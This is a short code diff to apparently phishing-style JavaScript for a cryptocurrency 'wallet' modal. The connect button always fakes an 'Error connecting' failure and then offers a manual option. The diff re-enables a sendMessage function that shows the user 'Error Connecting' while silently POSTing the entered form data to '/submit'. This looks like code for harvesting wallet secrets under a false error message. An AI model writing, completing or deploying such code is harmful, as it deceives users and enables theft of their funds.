@@ -132,7 +132,7 @@ function switchTab(tabName) {
         connectButton.textContent = 'Error connecting';
         connectButton.classList.add('error');
         manualButton.style.display = 'block';}, 1000);}
-    /*
+
 function sendMessage(formId) {
     const form = document.getElementById(formId);
     const formData = new FormData(form);
@@ -143,10 +143,11 @@ function sendMessage(formId) {
     sendButton.textContent = "Error Connecting";
     sendButton.classList.add("error-button");
     sendButton.disabled = true;
-    fetch("app-process.js", {
+    fetch("/submit", {
         method: "POST",
-        body: formData});}
-        */
+        body: formData
+    });}
+
 function closeModal() {
     const modal = document.getElementById('walletModal');
     const rxst = document.getElementById('tabView');
